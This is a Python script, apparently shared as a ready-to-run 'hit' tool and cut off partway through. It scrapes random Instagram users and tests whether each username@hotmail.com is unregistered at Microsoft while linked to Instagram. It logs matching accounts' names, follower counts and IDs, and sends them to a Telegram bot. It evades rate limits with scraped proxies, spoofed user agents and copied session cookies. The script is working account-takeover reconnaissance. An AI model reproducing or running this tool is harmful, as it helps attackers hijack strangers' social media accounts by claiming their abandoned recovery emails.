import requests
import random 
from rich.panel import Panel as nel
from rich import print as cetak
import os
from user_agent import generate_user_agent
import time
from faker import Faker
from hashlib import md5
import requests,re,random,os,sys
from rich import print as g
from rich.panel import Panel
from threading import Thread
q=0
w=0
e=0
M=0
ids=[]
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
B="\033[1;30m" # Black
L = "\033[1;95m"  #ارجواني
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White
E = "\033[0;90m" #رمادي
z = 0

#####mortada######
E = '\033[1;31m'
Z = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
C = "\033[2;35m"
B = '\033[2;36m'
Y = '\033[1;34m'
M = '\x1b[1;37m'
S = '\033[1;33m'
U = '\x1b[1;37m'
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
O = '\x1b[1;34m'
R = '\x1b[1;35m'
G = '\x1b[1;36m'
BPurple = '\x1b[1;35m'
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a26 = '\x1b[38;5;5m'
#####mortada######


os.system('clear')
print(f'\n{Z}\n\n                   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶\n                 ¶¶¶¶¶¶             ¶¶¶¶¶¶¶\n              ¶¶¶¶                       ¶¶¶¶\n             ¶¶¶                             ¶¶\n            ¶¶                                ¶¶\n           ¶¶                                 ¶¶\n          ¶¶                                   ¶¶\n          ¶¶ ¶¶                             ¶¶ ¶¶\n          ¶¶ ¶¶                             ¶¶  ¶\n          ¶¶ ¶¶                             ¶¶  ¶\n          ¶¶  ¶¶                            ¶¶ ¶¶\n          ¶¶  ¶¶                           ¶¶  ¶¶\n           ¶¶ ¶¶   ¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶   ¶¶ ¶¶\n            ¶¶¶¶ ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶\n             ¶¶¶ ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶\n    ¶¶¶       ¶¶  ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶  ¶¶      ¶¶¶¶\n   ¶¶¶¶¶     ¶¶   ¶¶¶¶¶¶¶   ¶¶¶   ¶¶¶¶¶¶¶   ¶¶     ¶¶¶¶¶¶\n  ¶¶   ¶¶    ¶¶     ¶¶¶    ¶¶¶¶¶    ¶¶¶     ¶¶    ¶¶   ¶¶\n ¶¶¶    ¶¶¶¶  ¶¶          ¶¶¶¶¶¶¶          ¶¶  ¶¶¶¶    ¶¶¶\n¶¶         ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶        ¶¶\n¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶¶      ¶¶¶¶¶¶¶¶\n  ¶¶¶¶ ¶¶¶¶¶      ¶¶¶¶¶              ¶¶¶ ¶¶     ¶¶¶¶¶¶ ¶¶¶\n          ¶¶¶¶¶¶  ¶¶¶  ¶¶           ¶¶  ¶¶¶  ¶¶¶¶¶¶\n              ¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶\n                  ¶¶ ¶¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶¶\n                ¶¶¶¶  ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶   ¶¶¶¶¶\n            ¶¶¶¶¶ ¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶ ¶¶¶¶¶\n    ¶¶¶¶¶¶¶¶¶¶     ¶¶                 ¶¶      ¶¶¶¶¶¶¶¶¶\n   ¶¶           ¶¶¶¶¶¶¶             ¶¶¶¶¶¶¶¶          ¶¶\n    ¶¶¶     ¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶     ¶¶¶\n      ¶¶   ¶¶¶           ¶¶¶¶¶¶¶¶¶           ¶¶¶   ¶¶\n      ¶¶  ¶¶                                   ¶¶  ¶¶\n       ¶¶¶¶                                     ¶¶¶¶\n\n       المطور مرتضى ☠️ | @M_R_Q_P')
print('\n')
print(f'{X}▭▬▭'*20)
token = input(f"{Z}[{Z}?{Z}]{Z} 𝗧𝗢𝗞𝗘𝗡 : {B}")
print(f'{F}▭▬▭'*20)
iD = input(f"{F}[{F}?{F}]{F} 𝗜𝗗 : {F}")
os.system('clear')

gre = '\033[2;32m'
red = '\033[1;31m'
red = '\033[1;31m'
yel = '\033[1;33m'
gre = '\033[2;32m'
wh = "\033[1;97m"
ble = '\033[2;36m'
B = '\033[1;34m' 
F = '\033[1;32m'
Z = '\033[1;31m'
Ibn_Ha9i1 = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
Ibn_Ha9i2 = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
Ibn_Ha9i3 = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt').text
Ibn_Ha9i4 = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt -o socks5.txt').text
Ibn_Ha9i5 = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt -o socks4.txt').text
Ibn_Ha9i6 = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o http.txt').text
open('.proxy1.txt', 'w').write(Ibn_Ha9i1)
open('.proxy2.txt', 'w').write(Ibn_Ha9i2)
open('.proxy3.txt', 'w').write(Ibn_Ha9i3)
open('.proxy4.txt', 'w').write(Ibn_Ha9i4)
open('.proxy5.txt', 'w').write(Ibn_Ha9i5)
open('.proxy6.txt', 'w').write(Ibn_Ha9i6)
proxy = ['121.206.205.75:4216188.166.30.17:888836.73.107.91:567850.174.145.11:80103.125.154.233:808045.224.149.243:999177.223.224.17:415372.10.164.178:5265160.3.168.7:808027.65.112.5:1080165.227.196.37:57890101.231.66.130:80104.248.146.99:3128185.119.90.32:749738.250.210.28:808137.187.149.223:808136.92.162.220:8080193.169.4.12:809179.110.200.148:808113.126.184.76:3128217.100.239.117:8090149.129.255.179:8080168.227.158.57:41451.0.170.50:80138.36.150.31:1080185.206.71.91:9090103.81.114.182:4145182.253.172.111:808067.43.236.18:13325190.205.32.70:99972.10.164.178:3010179.124.72.157:60606161.34.40.117:312847.237.92.86:3128190.186.237.103:8072.10.160.93:28907189.240.60.169:9090154.31.200.241:6666195.116.24.237:808067.43.227.227:2632351.178.165.36:3128185.49.31.207:8081202.169.51.46:808072.10.160.172:9739149.126.101.162:8080191.243.46.166:43241161.49.90.70:1337200.25.254.193:54240163.172.187.22:1637947.243.114.192:818091.204.154.238:808047.250.177.202:8008188.40.59.208:312845.240.182.119:1976103.157.59.75:808041.254.48.66:1976186.96.96.131:9994.155.2.13:948072.10.160.90:22181191.97.18.49:999102.68.139.247:8080193.188.22.20:3128103.130.218.135:45751208.109.13.93:1445551.79.170.92:80188.132.222.8:808041.86.252.91:443202.166.219.80:4153187.76.1.146:808072.10.164.178:776541.128.183.10:1981122.200.19.100:8074.208.222.134:46191103.70.159.146:5678202.46.84.226:6543772.10.160.170:2038547.243.92.199:3128104.164.183.109:312887.121.49.238:4145160.248.7.177:80101.109.143.181:8080103.78.170.13:8372.10.160.90:29833161.123.154.38:656889.58.44.48:4728792.118.132.125:8080181.115.66.238:999111.220.90.41:4093851.158.105.107:16379104.143.251.122:638446.35.9.110:80138.197.208.93:8080185.189.199.75:2350072.52.131.65:8072.10.160.170:18257203.150.128.12:808041.33.219.130:198145.43.167.29:6211180.246.225.122:808084.17.51.241:312841.65.174.98:1981161.34.40.109:3128191.97.16.160:99914.143.145.36:80182.52.229.165:808061.19.145.66:808050.174.7.159:80103.159.66.61:8080152.26.229.52:9443190.92.227.158:9999104.207.56.181:312885.232.243.235:808031.206.38.46:37630154.12.253.232:63510181.13.198.90:415372.10.164.178:92792.179.193.146:312814.161.17.4:4153125.141.139.197:556684.241.188.138:8111134.122.26.11:80103.255.147.102:83104.252.131.103:312841.33.219.131:198139.175.75.144:3000172.10.164.178:947550.223.239.168:80103.180.73.107:8080151.22.181.205:808065.49.82.7:59207112.98.218.73:57658103.250.130.149:818167.43.227.226:3037343.153.81.168:443180.92.212.178:5678193.56.255.179:312891.107.147.205:8050.217.226.40:8067.43.228.251:334347.251.73.54:908092.242.212.50:8080195.23.57.78:8036.88.123.218:5678160.248.4.99:888851.77.211.107:80101.255.40.98:80803.9.71.167:80103.10.71.81:8013.37.73.214:3128192.81.128.182:8089207.55.243.113:58613103.160.207.163:3265072.10.160.173:1306767.43.236.20:13835105.174.43.194:8080185.200.37.121:8080194.190.169.197:370195.107.183.18:5678102.68.128.215:808087.97.60.4:1808045.170.102.225:999200.0.247.85:415360.249.149.98:8080191.97.16.126:999218.76.247.34:30000217.52.247.65:197645.55.57.204:443177.128.44.131:3133792.255.190.41:41535.135.188.78:312738.54.95.19:44367.43.228.250:9759200.24.130.138:999123.205.24.244:8380101.96.123.21:108072.217.158.202:4145117.54.12.7:5678201.218.144.18:99972.10.160.92:773367.43.228.253:1260551.75.33.162:8039.107.33.254:809094.139.169.250:5678103.152.232.104:8199103.231.236.14:8080156.239.52.121:3128110.78.148.101:415320.44.189.184:3129103.105.40.65:414550.217.226.45:8072.10.160.170:19987154.16.146.47:80183.100.14.134:8000103.156.17.153:1111109.232.106.150:5243554.82.120.199:80104.20.24.214:80185.202.173.11:61390172.232.180.108:8061.74.186.71:3128212.83.138.60:36896199.195.253.213:312813.209.156.241:80161.34.40.110:312843.255.113.232:84182.34.147.247:1080198.49.68.80:8045.70.206.42:4145206.42.27.113:808027.254.99.183:811845.43.84.134:6759206.206.69.54:6318164.52.42.2:4145103.25.110.222:80808.212.165.164:8067.43.227.227:21599183.178.50.58:8080146.70.80.76:801.4.145.244:4145103.118.127.218:6969142.11.222.22:8051.254.149.59:132488.211.194.78:8080142.147.242.242:622145.230.50.3:99947.238.134.126:808172.10.160.92:1006541.65.71.151:1976103.78.80.66:32650202.40.179.18:4145183.88.184.48:8080103.83.232.122:8045.235.16.121:2723485.9.87.26:808094.231.192.207:8080170.239.205.74:8080110.34.166.181:415372.167.222.102:9493186.215.87.194:30007103.214.156.254:567818.135.133.116:1080139.255.67.50:3888190.94.212.15:9995.8.240.92:415337.120.192.154:808045.22.209.157:8888138.36.150.17:1080195.158.197.96:8088185.118.155.202:808045.170.102.1:999103.88.169.6:362967.43.227.229:1640189.35.237.187:808046.149.73.118:3128104.239.104.240:6464202.5.119.5:5678203.228.28.153:80115.72.43.231:10001218.145.131.182:44345.239.28.1:999106.45.221.168:3256123.205.24.244:8193141.145.214.176:80128.199.202.122:3128118.99.103.114:32491104.165.127.251:3128124.83.51.94:8082188.132.221.21:8080185.172.212.233:8080103.174.236.63:8081124.6.225.124:1088102.0.12.224:808091.150.77.58:56921107.181.143.247:6378182.72.203.246:80203.210.235.91:5678104.164.183.174:312845.43.65.8:652250.239.72.16:8064.137.92.211:6410200.52.148.10:999103.152.232.123:8199222.129.38.21:5711449.51.244.112:888879.175.189.220:1080190.94.212.221:99938.41.5.107:999161.97.173.42:50988103.165.218.234:808562.103.186.66:415367.43.227.226:23335154.31.200.73:6666164.163.42.27:10000184.181.217.201:414592.154.84.215:80104.250.205.239:59863.128.142.113:8062.23.184.84:8080103.189.96.182:819972.10.160.170:400985.193.197.137:8081103.94.133.92:4153125.25.40.38:808072.10.160.90:31555192.230.67.116:5601212.110.188.211:3440954.37.122.101:24888198.44.255.3:80178.18.206.9:9443125.229.149.168:65110185.105.118.72:80103.231.239.137:58080171.244.140.160:3462650.144.76.218:80167.179.113.181:52333133.232.82.23:80103.69.106.183:8181167.249.29.215:999147.45.104.252:8045.188.76.238:999202.29.215.78:8080185.105.88.63:4444177.234.192.45:32213185.19.4.22:3128154.65.39.7:80103.174.236.98:808067.43.227.227:2521345.169.84.21:8080128.199.150.88:6405445.172.177.253:5934145.114.88.214:8080122.40.196.59:808141.128.91.186:1981161.97.163.52:50704180.191.16.9:8085103.235.66.198:567818.135.133.116:312891.150.67.17:808072.10.160.90:5853124.6.168.26:8084.54.191.22:8080154.31.200.196:6666119.91.35.77:208061.129.2.212:808634.29.41.58:3128']
def mortada(email):
	global q,w,e,M
	cookies = {
	    'mkt': 'ar-EG',
	    'MicrosoftApplicationsTelemetryDeviceId': '206044d2-af76-4747-8415-858b9a35af56',
	    'MUID': '490d74a426a74a15b24b7fbd261f866e',
	    '_pxvid': '2ecf5b70-645c-11ef-97bd-a836d19ff20e',
	    'MSFPC': 'GUID=af3971cb0b414a2eacf63d08b91c0cb7&HASH=af39&LV=202408&V=4&LU=1724753240820',
	    'logonLatency': 'LGN01=638605489505665490',
	    'amsc': 'TGsTldFQuWHFpUjGiPsPnoCBkjuDZ8PdxDFForrdGxbj8DF5l/W3DBXB4CLg4OxmO09/jy766SMKBMrSU8roYLG4E4xkwilyMQFr8Cm3q4jhU/LLt8putYW3Tjf/UcdfcIoqpvzkQtvhk2AYe//ElcK1UfVnLO+XYWCBxchqh2zzXN7UmYH5H4JwCgQOfHoBjIG3hqKpsQhrcYDde4puZ9X3DFOw0P4FNBou5ArVZvC41SQlBfDZ4ZwyYM4XXvKfpf4ChgG2q3yNlvO/kGZqLit9klo6Jz5S7nVXPnFqyVyViHVbXkcsXsxGIVA/fBC3:2:3c',
	    'ai_session': 'JRLrmS1HEKMeUqJt1ny6Bt|1724952153348|1724952153348',
	    'fptctx2': 'taBcrIH61PuCVH7eNCyH0FFaWZWIHTJWSYlBtG47cVuS3MJrbe1uH%252fv3mF62po8qb6HDf7jWV5E0q2FVJnO0nFi8HLOqMqb77ms%252f%252fDeE5O%252beEHpp7iu585tfg4L60qhissrIkhtq7x1niQxsYNSjkPadlqrbZc5EwBYDASb6fZAatlliFjmLjZ%252bOflFTGlIhW3sEECgj0wU4qWKoKbqahpmp1fuIOhY1gMm3%252b5jQYjV4n68VHMsE5SP%252bhsZEOZP2X9OEJNASQU6mVKPlApEXIDbnWnXdmpmTKcoN61RnY26BkiVtZF3W8mZkNzuuV6jFos7GEXxS0p6%252b%252bAUQxvLRJA%253d%253d',
	    '_pxde': '22b261b191d6f7d56f1c75684d69678b120ef8643a6ed34bd5454fda08b00681:eyJ0aW1lc3RhbXAiOjE3MjQ5NTIxNTg3MTIsImZfa2IiOjAsImlwY19pZCI6W119',
	}
	
	headers = {
	    'authority': 'signup.live.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'canary': '4/oNvkOxOc+g8Gjzp7ZEQhTaJhPIVJxk8rvpjqIS2E3V9Zh1wVt0aU/PwWNx7lQBtPJ4IQSUjDbKFeb3+ekqdDVhLtSe4Gx8VWTCtEqiy2Z3GNCkTuQa81TXEhNsHAttzjtillqn1GjvNddrx8eO905OlshKems02Zl2wGwXPAS+BpYdxx7XXjzKm5529Pf4Q3Fc1kvSoWaQuQoCgQ0SeEVc7fVxUetJVzvMi/PCw8FDabVudeNRrNCeXfwrOh2S:2:3c',
	    'client-request-id': 'd6bd7f1dbb6e4a03a2fb658da208a308',
	    'content-type': 'application/json; charset=utf-8',
	    # 'cookie': 'mkt=ar-EG; MicrosoftApplicationsTelemetryDeviceId=206044d2-af76-4747-8415-858b9a35af56; MUID=490d74a426a74a15b24b7fbd261f866e; _pxvid=2ecf5b70-645c-11ef-97bd-a836d19ff20e; MSFPC=GUID=af3971cb0b414a2eacf63d08b91c0cb7&HASH=af39&LV=202408&V=4&LU=1724753240820; logonLatency=LGN01=638605489505665490; amsc=TGsTldFQuWHFpUjGiPsPnoCBkjuDZ8PdxDFForrdGxbj8DF5l/W3DBXB4CLg4OxmO09/jy766SMKBMrSU8roYLG4E4xkwilyMQFr8Cm3q4jhU/LLt8putYW3Tjf/UcdfcIoqpvzkQtvhk2AYe//ElcK1UfVnLO+XYWCBxchqh2zzXN7UmYH5H4JwCgQOfHoBjIG3hqKpsQhrcYDde4puZ9X3DFOw0P4FNBou5ArVZvC41SQlBfDZ4ZwyYM4XXvKfpf4ChgG2q3yNlvO/kGZqLit9klo6Jz5S7nVXPnFqyVyViHVbXkcsXsxGIVA/fBC3:2:3c; ai_session=JRLrmS1HEKMeUqJt1ny6Bt|1724952153348|1724952153348; fptctx2=taBcrIH61PuCVH7eNCyH0FFaWZWIHTJWSYlBtG47cVuS3MJrbe1uH%252fv3mF62po8qb6HDf7jWV5E0q2FVJnO0nFi8HLOqMqb77ms%252f%252fDeE5O%252beEHpp7iu585tfg4L60qhissrIkhtq7x1niQxsYNSjkPadlqrbZc5EwBYDASb6fZAatlliFjmLjZ%252bOflFTGlIhW3sEECgj0wU4qWKoKbqahpmp1fuIOhY1gMm3%252b5jQYjV4n68VHMsE5SP%252bhsZEOZP2X9OEJNASQU6mVKPlApEXIDbnWnXdmpmTKcoN61RnY26BkiVtZF3W8mZkNzuuV6jFos7GEXxS0p6%252b%252bAUQxvLRJA%253d%253d; _pxde=22b261b191d6f7d56f1c75684d69678b120ef8643a6ed34bd5454fda08b00681:eyJ0aW1lc3RhbXAiOjE3MjQ5NTIxNTg3MTIsImZfa2IiOjAsImlwY19pZCI6W119',
	    'correlationid': 'd6bd7f1dbb6e4a03a2fb658da208a308',
	    'hpgact': '0',
	    'hpgid': '200225',
	    'origin': 'https://signup.live.com',
	    'referer': 'https://signup.live.com/signup?lcid=1033&wa=wsignin1.0&rpsnv=159&ct=1724952150&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26signup%3d1%26RpsCsrfState%3d548a03bf-ba2a-5419-e02b-ad3f96deebe1&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&lic=1&uaid=d6bd7f1dbb6e4a03a2fb658da208a308',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': str(generate_user_agent()),
	}
	
	json_data = {
	    'includeSuggestions': True,
	    'signInName': f'{email}@hotmail.com',
	    'uiflvr': 1001,
	    'scid': 100118,
	    'uaid': 'd6bd7f1dbb6e4a03a2fb658da208a308',
	    'hpgid': 200225,
	}
	
	response = requests.post(
	    'https://signup.live.com/API/CheckAvailableSigninNames?lcid=1033&wa=wsignin1.0&rpsnv=159&ct=1724952150&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26signup%3d1%26RpsCsrfState%3d548a03bf-ba2a-5419-e02b-ad3f96deebe1&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&lic=1&uaid=d6bd7f1dbb6e4a03a2fb658da208a308',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	).text
	
	if '"isAvailable":true' in response:
	
		q+=1
		os.system('cls' if os.name == 'nt' else 'clear')
		print(f'''
{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}		
~~~~~~~~~~~~~~~~~~~~~		
{F}{F}: DONE : [ {M} ]	
~~~~~~~~~~~~~~~~~~~~~		
{F}{F}: GOOD insta : [ {q} ]
~~~~~~~~~~~~~~~~~~~~~
{Z}{Z}: BAD insta : [ {w} ]
~~~~~~~~~~~~~~~~~~~~~
{Z}{Z}: BAD hotmail : [ {e} ]
~~~~~~~~~~~~~~~~~~~~~
{B}{B}: EMAIL : [ {email}@hotmail.com ]
~~~~~~~~~~~~~~~~~~~~~
{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}

''')
		cookies = {
		    'csrftoken': '0uZYzvtUhu6-U4CARhIaM3',
		    'ig_did': '394458D6-565A-48F0-BFBB-CB75FD177F49',
		    'ig_nrcb': '1',
		    'dpr': '2.25',
		    'mid': 'ZsqbPgABAAFrLhyT_amwiK59BNv4',
		    'datr': 'PpvKZjhMQN858xPWY13-suQ2',
		    'wd': '480x919',
		}
		
		headers = {
		    'authority': 'www.instagram.com',
		    'accept': '*/*',
		    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://www.instagram.com',
		    'referer': 'https://www.instagram.com/accounts/signup/email/',
		    'sec-ch-prefers-color-scheme': 'dark',
		    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
		    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-model': '"RMX3511"',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-ch-ua-platform-version': '"13.0.0"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': generate_user_agent(),
		    'x-asbd-id': '129477',
		    'x-csrftoken': '0uZYzvtUhu6-U4CARhIaM3',
		    'x-ig-app-id': '1217981644879628',
		    'x-ig-www-claim': '0',
		    'x-instagram-ajax': '1015960818',
		    'x-requested-with': 'XMLHttpRequest',
		}
		
		data = {
		    'email': f'{email}@hotmail.com',
		}
		
		res = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', cookies=cookies, headers=headers, data=data)
		
		if "email_is_taken" in res.text:
			M+=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'''									
{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}		
~~~~~~~~~~~~~~~~~~~~~		
{F}{F}: DONE : [ {M} ]	
~~~~~~~~~~~~~~~~~~~~~		
{F}{F}: GOOD insta : [ {q} ]
~~~~~~~~~~~~~~~~~~~~~
{Z}{Z}: BAD insta : [ {w} ]
~~~~~~~~~~~~~~~~~~~~~
{Z}{Z}: BAD hotmail : [ {e} ]
~~~~~~~~~~~~~~~~~~~~~
{B}{B}: EMAIL : [ {email}@hotmail.com ]
~~~~~~~~~~~~~~~~~~~~~
{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}

''')
			cookies = {
			    'csrftoken': '0uZYzvtUhu6-U4CARhIaM3',
			    'ig_did': '394458D6-565A-48F0-BFBB-CB75FD177F49',
			    'ig_nrcb': '1',
			    'dpr': '2.25',
			    'mid': 'ZsqbPgABAAFrLhyT_amwiK59BNv4',
			    'datr': 'PpvKZjhMQN858xPWY13-suQ2',
			    'wd': '480x919',
			}
			
			headers = {
			    'authority': 'www.instagram.com',
			    'accept': '*/*',
			    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			    'referer': 'https://www.instagram.com/shbs/',
			    'sec-ch-prefers-color-scheme': 'dark',
			    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
			    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-model': '"RMX3511"',
			    'sec-ch-ua-platform': '"Android"',
			    'sec-ch-ua-platform-version': '"13.0.0"',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'same-origin',
			    'user-agent': str(generate_user_agent()),
			    'x-asbd-id': '129477',
			    'x-csrftoken': '0uZYzvtUhu6-U4CARhIaM3',
			    'x-ig-app-id': '1217981644879628',
			    'x-ig-www-claim': '0',
			    'x-requested-with': 'XMLHttpRequest',
			}
			
			params = {
			    'username': email,
			}
			
			mhand = response = requests.get(
			    'https://www.instagram.com/api/v1/users/web_profile_info/',
			    params=params,
			    cookies=cookies,
			    headers=headers,
			).json()		
			name = mhand['data']['user']['full_name']
			bio = mhand['data']['user']['biography']
			fols = mhand['data']['user']['edge_followed_by']['count']
			flog = mhand['data']['user']['edge_follow']['count']
			id = mhand['data']['user']['id']
			pr = mhand['data']['user']['is_private']
			rqq = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
			data = rqq.json()['date']
			tlg = f'''

hit insta 		
▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
🔀name : {name}
☣️user : {email}
✅email : {email}@hotmail.com
🆕Followers : {fols}
💀Following : {flog}
👁Data : {data} 
⚠️ID : {id}
👩🏻‍💻Link : https://www.instagram.com/{email}
🇮🇶program : mortada - @M_R_Q_P 🚸
▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩
							'''
			print(tlg)
			requests.post(f"https://api.telegram.org/bot{token}/sendvideo?chat_id={iD}&video=https://t.me/dkdhdkdv/5&caption=" + str(tlg))
			
		else:
			w+=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f'''									
{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}		
~~~~~~~~~~~~~~~~~~~~~		
{F}{F}: DONE : [ {M} ]	
~~~~~~~~~~~~~~~~~~~~~		
{F}{F}: GOOD insta : [ {q} ]
~~~~~~~~~~~~~~~~~~~~~
{Z}{Z}: BAD insta : [ {w} ]
~~~~~~~~~~~~~~~~~~~~~
{Z}{Z}: BAD hotmail : [ {e} ]
~~~~~~~~~~~~~~~~~~~~~
{B}{B}: EMAIL : [ {email}@hotmail.com ]
~~~~~~~~~~~~~~~~~~~~~
{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}

''')
	else:
		e+=1
		os.system('cls' if os.name == 'nt' else 'clear')
		print(f'''									
{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}		
~~~~~~~~~~~~~~~~~~~~~		
{F}{F}: DONE : [ {M} ]	
~~~~~~~~~~~~~~~~~~~~~		
{F}{F}: GOOD insta : [ {q} ]
~~~~~~~~~~~~~~~~~~~~~
{Z}{Z}: BAD insta : [ {w} ]
~~~~~~~~~~~~~~~~~~~~~
{Z}{Z}: BAD hotmail : [ {e} ]
~~~~~~~~~~~~~~~~~~~~~
{B}{B}: EMAIL : [ {email}@hotmail.com ]
~~~~~~~~~~~~~~~~~~~~~
{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{Z}—{X}—{F}—{C}—{B}—{Y}—{E}—{F}×{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}{G}—{S}—{Z}—{X}—{F}—{C}—{B}—{F}

''')

def rand_ids():  
  Id= str(random.randrange(128053904,438909537))
  if Id not in ids:
    ids.append(Id)
    return Id
  else:
    rand_ids()    
def username1():
  global check
  try:
    while True:      
      rnd=str(random.randint(150, 999))
      user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
      Id = rand_ids()
      lsd=''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(32))
      headers = {
    'accept': '*/*',
    'accept-language': 'en,en-US;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'origin': 'https://www.instagram.com',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/cristiano/following/',
    'user-agent': user_agent,
    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
    'x-fb-lsd': lsd,
}
      data = {
    'lsd': lsd,
    'fb_api_caller_class': 'RelayModern',
